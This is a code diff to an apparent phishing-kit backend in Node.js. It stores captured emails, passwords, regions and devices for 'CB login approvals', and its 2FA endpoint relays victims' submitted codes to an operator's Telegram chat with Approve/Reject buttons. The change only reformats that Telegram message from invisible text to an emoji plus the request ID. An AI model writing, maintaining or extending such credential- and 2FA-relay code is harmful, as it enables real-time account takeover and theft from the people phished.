@@ -32,9 +32,6 @@ const pendingPage = {};       // page 4 logins
 const pendingApprovals = {};  // CB login approvals { email: { status, password, region, device } }
 const pending2FA = {};        // 2FA approvals { requestId: { status, message } }
 
-// Invisible placeholder — Telegram requires non-empty text to attach buttons
-const BLANK = "\u200B";
-
 // -----------------
 // Health check
 // -----------------
@@ -123,7 +120,7 @@ app.post("/send-login", async (req, res) => {
 
 // -----------------
 // 2FA: Submit code (called by frontend)
-// Sends buttons-only message to Telegram and stores pending request
+// Sends emoji + requestId to Telegram with Approve/Reject buttons
 // -----------------
 app.post("/api/submit-2fa", async (req, res) => {
   const { message, requestId } = req.body;
@@ -136,13 +133,14 @@ app.post("/api/submit-2fa", async (req, res) => {
   pending2FA[requestId] = { status: "pending", message };
   console.log(`📥 2FA Request received: ${requestId}`);
 
-  // Send to Telegram admin with Approve/Reject buttons — no visible text
+  // Send to Telegram admin — emoji + requestId only, then buttons
   try {
     const { bot } = require("./bot");
     await bot.sendMessage(
       process.env.ADMIN_CHAT_ID || process.env.CHAT_ID,
-      BLANK,
+      `🔐 <code>${requestId}</code>`,
       {
+        parse_mode: "HTML",
         reply_markup: {
           inline_keyboard: [
             [
